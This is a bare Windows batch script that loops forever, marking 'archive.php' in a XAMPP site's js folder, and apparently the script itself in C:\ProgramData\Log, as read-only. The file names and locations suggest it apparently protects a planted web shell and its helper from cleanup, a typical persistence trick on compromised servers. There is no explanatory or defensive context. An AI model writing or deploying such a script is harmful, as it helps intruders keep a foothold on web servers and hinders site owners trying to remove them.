@echo off
:loop
attrib +r /s /d "C:\xampp\htdocs\modulfk\js\archive.php"
attrib +r /s /d "C:\ProgramData\Log\file.bat"
timeout /t 60000000000000 /nobreak >nul
goto loop
